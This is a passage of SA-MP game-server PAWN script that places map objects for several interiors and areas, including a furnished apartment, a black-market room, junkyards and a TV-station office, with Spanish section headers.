	CreateDynamicObject_e(18459,-1689.79980469,1894.19921875,1069.50000000,0.00000000,0.00000000,0.00000000); //object(cs_detrok07) (7)
	CreateDynamicObject_e(18459,-1689.79980469,1903.79980469,1069.50000000,0.00000000,0.00000000,0.00000000); //object(cs_detrok07) (8)
	CreateDynamicObject_e(18459,-1694.59997559,1908.69995117,1069.50000000,0.00000000,0.00000000,270.00000000); //object(cs_detrok07) (9)
	CreateDynamicObject_e(18459,-1704.19921875,1908.69921875,1069.50000000,0.00000000,0.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.30004883,1907.59997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.30004883,1904.09997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.30004883,1900.59997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.19995117,1897.09997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.19995117,1893.59997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.19995117,1890.09997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.19995117,1886.59997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.19995117,1883.09997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1704.19995117,1879.59997559,1067.69995117,0.00000000,270.00000000,270.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.69995117,1904.30004883,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.69995117,1907.69995117,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.69995117,1900.90002441,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.69995117,1897.40002441,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.69995117,1894.00000000,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.59997559,1890.59997559,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.59997559,1887.09997559,1067.69995117,0.00000000,270.00000000,89.99993896); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.59997559,1883.59997559,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(18459,-1694.59997559,1880.09997559,1067.69995117,0.00000000,270.00000000,90.00000000); //object(cs_detrok07) (10)
	CreateDynamicObject_e(1429,-1708.50000000,1904.09997559,1069.30004883,0.00000000,0.00000000,90.00000000); //object(dyn_tv) (1)
	CreateDynamicObject_e(1743,-1704.00000000,1907.00000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_cabinet_3) (1)
	CreateDynamicObject_e(1742,-1707.09997559,1908.59997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_bookshelf) (1)
	CreateDynamicObject_e(1740,-1705.80004883,1907.00000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(low_cabinet_3) (1)
	CreateDynamicObject_e(1417,-1705.00000000,1908.09997559,1068.00000000,0.00000000,0.00000000,0.00000000); //object(dyn_cupboard) (1)
	CreateDynamicObject_e(1416,-1708.69995117,1903.69995117,1068.40002441,0.00000000,0.00000000,90.00000000); //object(dyn_unit) (1)
	CreateDynamicObject_e(1429,-1708.50000000,1903.30004883,1069.30004883,0.00000000,0.00000000,90.00000000); //object(dyn_tv) (2)
	CreateDynamicObject_e(1416,-1708.69995117,1902.30004883,1068.40002441,0.00000000,0.00000000,90.00000000); //object(dyn_unit) (2)
	CreateDynamicObject_e(1416,-1708.69995117,1900.90002441,1068.40002441,0.00000000,0.00000000,90.00000000); //object(dyn_unit) (3)
	CreateDynamicObject_e(1416,-1708.69995117,1899.50000000,1068.40002441,0.00000000,0.00000000,90.00000000); //object(dyn_unit) (4)
	CreateDynamicObject_e(1416,-1708.69995117,1898.09997559,1068.40002441,0.00000000,0.00000000,90.00000000); //object(dyn_unit) (5)
	CreateDynamicObject_e(1416,-1708.69995117,1896.69995117,1068.40002441,0.00000000,0.00000000,90.00000000); //object(dyn_unit) (6)
	CreateDynamicObject_e(1416,-1708.69995117,1895.30004883,1068.40002441,0.00000000,0.00000000,90.00000000); //object(dyn_unit) (7)
	CreateDynamicObject_e(1518,-1708.40002441,1902.59997559,1069.30004883,0.00000000,0.00000000,90.00000000); //object(dyn_tv_2) (1)
	CreateDynamicObject_e(1518,-1708.40002441,1901.90002441,1069.30004883,0.00000000,0.00000000,90.00000000); //object(dyn_tv_2) (2)
	CreateDynamicObject_e(1747,-1708.80004883,1901.50000000,1069.00000000,0.00000000,0.00000000,90.00000000); //object(low_tv_2) (1)
	CreateDynamicObject_e(1747,-1708.69995117,1900.80004883,1069.00000000,0.00000000,0.00000000,90.00000000); //object(low_tv_2) (2)
	CreateDynamicObject_e(1751,-1708.90002441,1900.00000000,1069.00000000,0.00000000,0.00000000,90.00000000); //object(med_tv_4) (1)
	CreateDynamicObject_e(1751,-1708.90002441,1899.09997559,1069.00000000,0.00000000,0.00000000,90.00000000); //object(med_tv_4) (2)
	CreateDynamicObject_e(1752,-1708.69995117,1898.09997559,1069.00000000,0.00000000,0.00000000,90.00000000); //object(swank_tv_3) (1)
	CreateDynamicObject_e(1752,-1708.69995117,1897.00000000,1069.00000000,0.00000000,0.00000000,90.00000000); //object(swank_tv_3) (2)
	CreateDynamicObject_e(1752,-1708.69995117,1895.80004883,1069.00000000,0.00000000,0.00000000,90.00000000); //object(swank_tv_3) (3)
	CreateDynamicObject_e(1796,-1690.80004883,1903.80004883,1067.80004883,0.00000000,0.00000000,0.00000000); //object(low_bed_4) (1)
	CreateDynamicObject_e(1797,-1691.30004883,1900.59997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_bed_3) (1)
	CreateDynamicObject_e(1798,-1691.40002441,1897.50000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_bed_1) (1)
	CreateDynamicObject_e(1799,-1693.30004883,1904.09997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_bed_4) (1)
	CreateDynamicObject_e(1802,-1693.50000000,1900.19995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_bed_2) (1)
	CreateDynamicObject_e(1803,-1693.50000000,1897.09997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_bed_7) (1)
	CreateDynamicObject_e(2090,-1691.50000000,1893.80004883,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_bed_5) (1)
	CreateDynamicObject_e(2091,-1696.30004883,1908.30004883,1067.80004883,0.00000000,0.00000000,0.00000000); //object(tv_ward_med_1) (1)
	CreateDynamicObject_e(2093,-1697.90002441,1906.90002441,1067.80004883,0.00000000,0.00000000,0.00000000); //object(tv_ward_low) (1)
	CreateDynamicObject_e(2099,-1700.90002441,1908.30004883,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_hi_fi_1) (1)
	CreateDynamicObject_e(2100,-1699.40002441,1908.30004883,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_hi_fi_2) (1)
	CreateDynamicObject_e(2101,-1702.00000000,1908.00000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_hi_fi_3) (1)
	CreateDynamicObject_e(2102,-1703.50000000,1908.09997559,1069.09997559,0.00000000,0.00000000,0.00000000); //object(low_hi_fi_2) (1)
	CreateDynamicObject_e(2103,-1696.09997559,1908.09997559,1069.80004883,0.00000000,0.00000000,0.00000000); //object(low_hi_fi_1) (1)
	CreateDynamicObject_e(2104,-1708.19995117,1908.50000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_hi_fi) (1)
	CreateDynamicObject_e(2127,-1690.30004883,1889.40002441,1067.80004883,0.00000000,0.00000000,270.00000000); //object(cj_k1_fridge_unit) (1)
	CreateDynamicObject_e(2130,-1690.40002441,1887.30004883,1067.80004883,0.00000000,0.00000000,270.00000000); //object(cj_k1_sink) (1)
	CreateDynamicObject_e(2131,-1690.40002441,1885.30004883,1067.80004883,0.00000000,0.00000000,270.00000000); //object(cj_kitch2_fridge) (1)
	CreateDynamicObject_e(2132,-1690.40002441,1883.00000000,1067.80004883,0.00000000,0.00000000,270.00000000); //object(cj_kitch2_sink) (1)
	CreateDynamicObject_e(2135,-1690.30004883,1890.59997559,1067.80004883,0.00000000,0.00000000,270.00000000); //object(cj_k3_cooker) (1)
	CreateDynamicObject_e(2136,-1690.50000000,1892.80004883,1067.80004883,0.00000000,0.00000000,266.00000000); //object(cj_k3_sink) (1)
	CreateDynamicObject_e(2230,-1699.19995117,1897.50000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_speaker_2) (1)
	CreateDynamicObject_e(2231,-1698.30004883,1897.50000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_speaker_3) (1)
	CreateDynamicObject_e(2232,-1700.50000000,1897.30004883,1068.40002441,0.00000000,0.00000000,0.00000000); //object(med_speaker_4) (1)
	CreateDynamicObject_e(2233,-1697.30004883,1897.59997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_speaker_4) (1)
	CreateDynamicObject_e(2296,-1708.69995117,1890.50000000,1067.80004883,0.00000000,0.00000000,90.00000000); //object(tv_unit_1) (1)
	CreateDynamicObject_e(2297,-1701.50000000,1900.50000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(tv_unit_2) (1)
	CreateDynamicObject_e(2298,-1697.19995117,1896.90002441,1067.80004883,0.00000000,0.00000000,0.00000000); //object(swank_bed_7) (1)
	CreateDynamicObject_e(2300,-1700.09997559,1900.69995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_bed_8) (1)
	CreateDynamicObject_e(2301,-1704.59997559,1901.69995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(med_bed_9) (1)
	CreateDynamicObject_e(2415,-1702.30004883,1895.00000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_ff_fryer) (1)
	CreateDynamicObject_e(2417,-1700.69995117,1895.09997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_ff_cooker) (1)
	CreateDynamicObject_e(2421,-1698.40002441,1895.40002441,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_ff_microw) (1)
	CreateDynamicObject_e(2452,-1696.69995117,1895.69995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_ff_fridge2) (1)
	CreateDynamicObject_e(2514,-1700.00000000,1892.90002441,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_toilet1) (1)
	CreateDynamicObject_e(2517,-1701.69995117,1892.30004883,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_shower1) (1)
	CreateDynamicObject_e(2522,-1697.69995117,1893.40002441,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_bath3) (1)
	CreateDynamicObject_e(2525,-1699.90002441,1891.69995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_toilet4) (1)
	CreateDynamicObject_e(2526,-1703.59997559,1892.00000000,1067.80004883,0.00000000,0.00000000,0.00000000); //object(cj_bath4) (1)
	CreateDynamicObject_e(2627,-1703.50000000,1889.09997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(gym_treadmill) (1)
	CreateDynamicObject_e(2628,-1700.50000000,1889.30004883,1067.80004883,0.00000000,0.00000000,0.00000000); //object(gym_bench2) (1)
	CreateDynamicObject_e(2629,-1697.40002441,1890.19995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(gym_bench1) (1)
	CreateDynamicObject_e(2630,-1701.69995117,1887.69995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(gym_bike) (1)
	CreateDynamicObject_e(2631,-1698.50000000,1887.69995117,1067.80004883,0.00000000,0.00000000,0.00000000); //object(gym_mat1) (1)
	CreateDynamicObject_e(2632,-1694.90002441,1891.59997559,1067.80004883,0.00000000,0.00000000,0.00000000); //object(gym_mat02) (1)
	CreateDynamicObject_e(2864,-1697.59997559,1893.90002441,1068.69995117,0.00000000,0.00000000,0.00000000); //object(gb_kitchplatecln04) (1)
	CreateDynamicObject_e(2623,-1707.59997559,1883.69995117,1069.40002441,0.00000000,0.00000000,90.00000000); //object(cj_pro_counter) (1)
	CreateDynamicObject_e(2623,-1707.59997559,1887.19995117,1069.40002441,0.00000000,0.00000000,90.00000000); //object(cj_pro_counter) (2)
	CreateDynamicObject_e(2604,-1693.59997559,1887.59997559,1068.59997559,0.00000000,0.00000000,0.00000000); //object(cj_police_counter) (1)
	CreateDynamicObject_e(2948,-1697.00000000,1879.90002441,1067.80004883,0.00000000,0.00000000,270.00000000); //object(cr_door_02) (1)
	CreateDynamicObject_e(2948,-1698.90002441,1879.90002441,1067.80004883,0.00000000,0.00000000,90.00000000); //object(cr_door_02) (2)
	CreateDynamicObject_e(10932,-1700.40002441,1891.09997559,1067.40002441,0.00000000,0.00000000,0.00000000); //object(station03_sfs) (1)

	//                          MERCADO NEGRO (UNITY)                   //
	CreateDynamicObject(3050,1702.59997559,-1971.00000000,8.80000019,0.00000000,180.00000000,270.00000000); //object(des_quarrygate2) (1)
	CreateDynamicObject(3050,1702.59997559,-1964.90002441,8.80000019,0.00000000,179.99450684,270.00000000); //object(des_quarrygate2) (5)
	CreateDynamicObject(1491,1702.59997559,-1971.00000000,7.80000019,0.00000000,0.00000000,90.00000000); //object(gen_doorint01) (2)
	CreateDynamicObject(3050,1692.40002441,-1942.50000000,9.30000019,0.00000000,179.99450684,180.00000000); //object(des_quarrygate2) (6)
	CreateDynamicObject(3050,1697.00000000,-1942.50000000,9.30000019,0.00000000,179.99450684,179.99450684); //object(des_quarrygate2) (7)
	CreateDynamicObject(2637,1691.40002441,-1948.30004883,7.69999981,0.00000000,0.00000000,0.00000000); //object(cj_pizza_table2) (1)
	CreateDynamicObject(2637,1693.50000000,-1948.30004883,7.69999981,0.00000000,0.00000000,0.00000000); //object(cj_pizza_table2) (2)
	CreateDynamicObject(2637,1689.30004883,-1948.30004883,7.69999981,0.00000000,0.00000000,0.00000000); //object(cj_pizza_table2) (3)
	CreateDynamicObject(2639,1693.59997559,-1946.59997559,7.90000010,0.00000000,0.00000000,180.00000000); //object(cj_pizza_chair3) (1)
	CreateDynamicObject(2639,1689.19995117,-1946.59997559,7.90000010,0.00000000,0.00000000,179.99450684); //object(cj_pizza_chair3) (2)
	CreateDynamicObject(2639,1691.40002441,-1946.59997559,7.90000010,0.00000000,0.00000000,179.99450684); //object(cj_pizza_chair3) (3)
	CreateDynamicObject(335,1689.19995117,-1948.59997559,8.39999962,0.00000000,179.99993896,0.00000000); //object(1)
	CreateDynamicObject(336,1689.59997559,-1948.69995117,8.19999981,0.00000000,86.00000000,0.00000000); //object(2)
	CreateDynamicObject(344,1690.50000000,-1948.90002441,8.30000019,0.00000000,0.00000000,0.00000000); //object(3)
	CreateDynamicObject(346,1691.59997559,-1948.50000000,8.19999981,284.13928223,188.21380615,183.96813965); //object(4)
	CreateDynamicObject(347,1690.80004883,-1948.59997559,8.19999981,295.88571167,23.43753052,21.30682373); //object(5)
	CreateDynamicObject(348,1691.40002441,-1948.09997559,8.19999981,278.00000000,359.99987793,359.99987793); //object(6)
	CreateDynamicObject(349,1692.80004883,-1948.30004883,8.19999981,281.64614868,59.34017944,58.81481934); //object(7)
	CreateDynamicObject(352,1693.69995117,-1948.30004883,8.19999981,272.82812500,134.98236084,133.01733398); //object(8)
	CreateDynamicObject(355,1692.80004883,-1948.69995117,8.19999981,278.24462891,103.94561768,104.08547974); //object(9)
	CreateDynamicObject(357,1689.59997559,-1948.19995117,8.19999981,280.19604492,78.80456543,78.62957764); //object(10)
	CreateDynamicObject(372,1690.50000000,-1948.00000000,8.19999981,274.47143555,116.52294922,116.59280396); //object(11)
	CreateDynamicObject(373,1688.50000000,-1948.50000000,8.60000038,332.45904541,300.23733521,249.57638550); //object(12)
	CreateDynamicObject(2043,1688.69995117,-1949.90002441,7.40000010,0.00000000,0.00000000,0.00000000); //object(ammo_box_m4) (1)
	CreateDynamicObject(930,1693.50000000,-1956.90002441,7.69999981,0.00000000,0.00000000,0.00000000); //object(o2_bottles) (1)
	CreateDynamicObject(925,1689.19995117,-1961.80004883,8.30000019,0.00000000,0.00000000,0.00000000); //object(rack2) (1)
	CreateDynamicObject(964,1689.09997559,-1958.00000000,7.30000019,0.00000000,0.00000000,0.00000000); //object(cj_metal_crate) (1)
	CreateDynamicObject(2359,1689.09997559,-1956.30004883,7.50000000,0.00000000,0.00000000,0.00000000); //object(ammo_box_c5) (1)
	CreateDynamicObject(2358,1689.09997559,-1955.19995117,7.40000010,0.00000000,0.00000000,0.00000000); //object(ammo_box_c2) (1)
	CreateDynamicObject(2043,1693.80004883,-1959.90002441,7.40000010,0.00000000,0.00000000,0.00000000); //object(ammo_box_m4) (2)
	CreateDynamicObject(942,1691.69995117,-1974.59997559,10.30000019,0.00000000,0.00000000,0.00000000); //object(cj_df_unit_2) (1)
	CreateDynamicObject(939,1696.80004883,-1974.50000000,10.30000019,0.00000000,0.00000000,0.00000000); //object(cj_df_unit) (1)
	CreateDynamicObject(1636,1699.69995117,-1972.00000000,8.19999981,0.00000000,0.00000000,0.00000000); //object(rcbomb) (1)
	CreateDynamicObject(1654,1689.59997559,-1958.19995117,8.50000000,0.00000000,0.00000000,0.00000000); //object(dynamite) (1)
	CreateDynamicObject(964,1690.40002441,-1958.00000000,7.30000019,0.00000000,0.00000000,0.00000000); //object(cj_metal_crate) (2)
	CreateDynamicObject(964,1689.69995117,-1972.19995117,7.80000019,0.00000000,0.00000000,80.00000000); //object(cj_metal_crate) (3)
	CreateDynamicObject(964,1689.90002441,-1971.00000000,7.80000019,0.00000000,0.00000000,79.99694824); //object(cj_metal_crate) (4)
	CreateDynamicObject(8843,1703.69995117,-1971.19995117,7.90000010,0.00000000,0.00000000,90.00000000); //object(arrows01_lvs) (1)
	CreateDynamicObject(8843,1691.90002441,-1962.90002441,7.30000019,0.00000000,0.00000000,0.00000000); //object(arrows01_lvs) (2)

	//                          BASUREROS - DESCARGAS                   //
	CreateDynamicObject(18245,2568.00000000,-878.79998779,94.30000305,0.00000000,6.00000000,0.00000000); //object(cuntwjunk02) (1)
	CreateDynamicObject(18249,2494.30004883,-846.90002441,99.30000305,354.17886353,14.07406616,341.45593262); //object(cuntwjunk05) (1)
	CreateDynamicObject(13591,2555.39990234,-856.70001221,84.40000153,0.00000000,6.00000000,0.00000000); //object(kickcar28) (1)
	CreateDynamicObject(3594,2548.60009766,-856.79998779,85.19999695,0.00000000,10.00000000,0.00000000); //object(la_fuckcar1) (1)
	CreateDynamicObject(3594,2545.80004883,-856.50000000,85.69999695,0.00000000,9.99755859,0.00000000); //object(la_fuckcar1) (2)
	CreateDynamicObject(3594,2542.80004883,-856.59997559,86.19999695,0.00000000,9.99755859,0.00000000); //object(la_fuckcar1) (3)
	CreateDynamicObject(852,2529.80004883,-853.59997559,87.59999847,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_4) (1)
	CreateDynamicObject(853,2528.10009766,-852.59997559,88.30000305,0.00000000,10.00000000,0.00000000); //object(cj_urb_rub_5) (1)
	CreateDynamicObject(18249,2515.39990234,-855.00000000,96.00000000,0.00000000,3.99707031,333.99938965); //object(cuntwjunk05) (2)
	CreateDynamicObject(18249,2597.89941406,-851.89941406,80.90000153,356.08337402,12.02453613,340.82885742); //object(cuntwjunk05) (3)
	CreateDynamicObject(18248,2505.80004883,-816.20001221,97.59999847,0.00000000,0.00000000,339.99633789); //object(cuntwjunk01) (2)
	CreateDynamicObject(18248,2499.00000000,-814.09997559,97.40000153,0.00000000,0.00000000,339.99389648); //object(cuntwjunk01) (3)
	CreateDynamicObject(853,2530.89990234,-851.20001221,87.90000153,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_5) (2)
	CreateDynamicObject(852,2532.69995117,-854.90002441,87.19999695,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_4) (2)
	CreateDynamicObject(851,2533.89990234,-852.50000000,87.30000305,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_2) (1)
	CreateDynamicObject(851,2529.30004883,-856.20001221,88.00000000,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_2) (2)
	CreateDynamicObject(849,2533.50000000,-858.59997559,87.30000305,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_3) (1)
	CreateDynamicObject(849,2536.30004883,-856.50000000,86.90000153,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_3) (2)
	CreateDynamicObject(5291,2463.69995117,-852.79998779,114.09999847,0.00000000,0.00000000,0.00000000); //object(snpedscrsap_las01) (1)
	CreateDynamicObject(2890,2537.50000000,-844.79998779,86.59999847,0.00000000,0.00000000,0.00000000); //object(kmb_skip) (1)
	CreateDynamicObject(1440,2542.89990234,-846.79998779,86.19999695,0.00000000,0.00000000,0.00000000); //object(dyn_box_pile_3) (1)
	CreateDynamicObject(1439,2535.50000000,-864.09997559,86.59999847,0.00000000,0.00000000,0.00000000); //object(dyn_dumpster_1) (1)
	CreateDynamicObject(1365,2526.39990234,-838.00000000,89.30000305,0.00000000,0.00000000,0.00000000); //object(cj_big_skip1) (1)

	//                          BASUREROS                               //
	CreateDynamicObject(852,1235.90002441,-1266.40002441,12.39999962,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_4) (2)
	CreateDynamicObject(849,1240.19995117,-1266.40002441,12.69999981,0.00000000,0.00000000,0.00000000); //object(cj_urb_rub_3) (1)
	CreateDynamicObject(1440,1243.40002441,-1264.50000000,12.89999962,0.00000000,0.00000000,0.00000000); //object(dyn_box_pile_3) (1)
	CreateDynamicObject(1358,1232.50000000,-1267.80004883,13.69999981,0.00000000,0.00000000,0.00000000); //object(cj_skip_rubbish) (1)
	CreateDynamicObject(2674,1239.50000000,-1261.40002441,16.20000076,0.00000000,0.00000000,0.00000000); //object(proc_rubbish_2) (1)
	CreateDynamicObject(960,1237.50000000,-1264.09997559,12.69999981,0.00000000,0.00000000,0.00000000); //object(cj_arm_crate) (1)
	CreateDynamicObject(2890,1263.50000000,-1238.90002441,15.69999981,0.00000000,0.00000000,0.00000000); //object(kmb_skip) (1)
	CreateDynamicObject(1358,1255.59997559,-1240.80004883,18.20000076,0.00000000,0.00000000,0.00000000); //object(cj_skip_rubbish) (2)
	CreateDynamicObject(923,1251.00000000,-1239.40002441,17.60000038,0.00000000,0.00000000,0.00000000); //object(packing_carates2) (1)
	CreateDynamicObject(3035,1268.59997559,-1271.40002441,13.30000019,0.00000000,0.00000000,0.00000000); //object(tmp_bin) (1)
	CreateDynamicObject(3035,1266.09997559,-1271.40002441,13.30000019,0.00000000,0.00000000,0.00000000); //object(tmp_bin) (2)
	CreateDynamicObject(3035,1263.30004883,-1271.50000000,13.30000019,0.00000000,0.00000000,0.00000000); //object(tmp_bin) (3)
	CreateDynamicObject(3035,1260.50000000,-1271.30004883,13.30000019,0.00000000,0.00000000,0.00000000); //object(tmp_bin) (4)

	//                          LSTV (PUBLICO)                          //
	CreateDynamicObject_e(18611,-1971.30004883,607.29998779,1056.19995117,0.00000000,0.00000000,0.00000000); //object(cs_landbit_71_a) (1)
	CreateDynamicObject_e(18610,-1973.09997559,607.40002441,1054.50000000,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (1)
	CreateDynamicObject_e(18610,-1976.59997559,607.40002441,1054.50000000,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (2)
	CreateDynamicObject_e(18610,-1980.09997559,607.40002441,1054.50000000,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (3)
	CreateDynamicObject_e(18611,-1980.19995117,607.59997559,1056.19995117,0.00000000,0.00000000,0.00000000); //object(cs_landbit_71_a) (2)
	CreateDynamicObject_e(18610,-1980.09997559,597.79998779,1054.50000000,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (4)
	CreateDynamicObject_e(18610,-1976.59997559,597.79998779,1054.50000000,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (5)
	CreateDynamicObject_e(18610,-1973.09997559,597.79998779,1054.50000000,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (6)
	CreateDynamicObject_e(18611,-1971.30004883,597.90002441,1056.19995117,0.00000000,0.00000000,0.00000000); //object(cs_landbit_71_a) (4)
	CreateDynamicObject_e(18611,-1980.19995117,598.00000000,1056.19995117,0.00000000,0.00000000,0.00000000); //object(cs_landbit_71_a) (5)
	CreateDynamicObject_e(18611,-1975.50000000,612.19921875,1056.19995117,0.00000000,0.00000000,90.00000000); //object(cs_landbit_71_a) (6)
	CreateDynamicObject_e(18611,-1975.59997559,593.40002441,1056.19995117,0.00000000,0.00000000,90.00000000); //object(cs_landbit_71_a) (8)
	CreateDynamicObject_e(1705,-1976.69995117,611.40002441,1054.59997559,0.00000000,0.00000000,300.00000000); //object(kb_chair04) (1)
	CreateDynamicObject_e(1705,-1976.19995117,608.79998779,1054.59997559,0.00000000,0.00000000,229.99816895); //object(kb_chair04) (2)
	CreateDynamicObject_e(1714,-1979.59960938,609.69921875,1054.59997559,0.00000000,0.00000000,79.99694824); //object(kb_swivelchair1) (1)
	CreateDynamicObject_e(2008,-1978.50000000,610.40002441,1054.59997559,0.00000000,0.00000000,270.00000000); //object(officedesk1) (1)
	CreateDynamicObject_e(2008,-1978.59997559,603.09997559,1054.59997559,0.00000000,0.00000000,270.00000000); //object(officedesk1) (2)
	CreateDynamicObject_e(1714,-1979.69995117,602.20001221,1054.59997559,0.00000000,0.00000000,79.99694824); //object(kb_swivelchair1) (2)
	CreateDynamicObject_e(1705,-1976.59997559,601.79998779,1054.59997559,0.00000000,0.00000000,229.99328613); //object(kb_chair04) (3)
	CreateDynamicObject_e(1705,-1977.00000000,603.90002441,1054.59997559,0.00000000,0.00000000,299.99328613); //object(kb_chair04) (4)
	CreateDynamicObject_e(2193,-1973.00000000,610.50000000,1054.59997559,0.00000000,0.00000000,0.00000000); //object(med_office2_desk_2) (1)
	CreateDynamicObject_e(2193,-1972.00000000,607.59997559,1054.59997559,0.00000000,0.00000000,90.00000000); //object(med_office2_desk_2) (2)
	CreateDynamicObject_e(2746,-1972.59997559,598.00000000,1055.19995117,0.00000000,0.00000000,0.00000000); //object(cj_donut_chair) (1)
	CreateDynamicObject_e(2747,-1972.80004883,600.00000000,1055.00000000,0.00000000,0.00000000,0.00000000); //object(cj_donut_table) (1)
	CreateDynamicObject_e(2748,-1972.80004883,601.50000000,1055.19995117,0.00000000,0.00000000,0.00000000); //object(cj_donut_chair2) (1)
	CreateDynamicObject_e(2748,-1972.59997559,595.00000000,1055.19995117,0.00000000,0.00000000,180.00000000); //object(cj_donut_chair2) (2)
	CreateDynamicObject_e(2747,-1972.69995117,596.20001221,1055.00000000,0.00000000,0.00000000,0.00000000); //object(cj_donut_table) (2)
	CreateDynamicObject_e(2837,-1972.90002441,600.00000000,1055.40002441,0.00000000,0.00000000,0.00000000); //object(gb_takeaway02) (1)
	CreateDynamicObject_e(2837,-1972.80004883,596.29998779,1055.40002441,0.00000000,0.00000000,0.00000000); //object(gb_takeaway02) (2)
	CreateDynamicObject_e(1505,-1977.80004883,593.50000000,1054.59997559,0.00000000,0.00000000,0.00000000); //object(gen_doorext07) (1)
	CreateDynamicObject_e(1714,-1972.19995117,610.70001221,1054.59997559,0.00000000,0.00000000,179.99694824); //object(kb_swivelchair1) (3)
	CreateDynamicObject_e(1714,-1972.00000000,608.40002441,1054.59997559,0.00000000,0.00000000,269.99450684); //object(kb_swivelchair1) (4)
	CreateDynamicObject_e(16001,-1980.09997559,602.79998779,1056.59997559,0.00000000,90.00000000,0.00000000); //object(drvin_projhut) (1)
	CreateDynamicObject_e(16001,-1980.09997559,610.09997559,1056.59997559,0.00000000,90.00000000,0.00000000); //object(drvin_projhut) (2)
	CreateDynamicObject_e(18610,-1976.59997559,597.79998779,1057.80004883,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (7)
	CreateDynamicObject_e(18610,-1980.09997559,597.79998779,1057.80004883,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (8)
	CreateDynamicObject_e(18610,-1973.09997559,597.79998779,1057.80004883,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (9)
	CreateDynamicObject_e(18610,-1973.09997559,607.40002441,1057.80004883,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (10)
	CreateDynamicObject_e(18610,-1980.09997559,607.40002441,1057.80004883,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (11)
	CreateDynamicObject_e(18610,-1976.59997559,607.40002441,1057.80004883,0.00000000,270.00000000,0.00000000); //object(cs_landbit_70_a) (12)
	CreateDynamicObject_e(14406,-1979.19995117,594.40002441,1054.09997559,0.00000000,0.00000000,240.00000000); //object(mansion-light05) (1)
	CreateDynamicObject_e(14406,-1974.50000000,611.29998779,1054.09997559,0.00000000,0.00000000,89.99633789); //object(mansion-light05) (2)

	//                          GROTTI EXT                        //
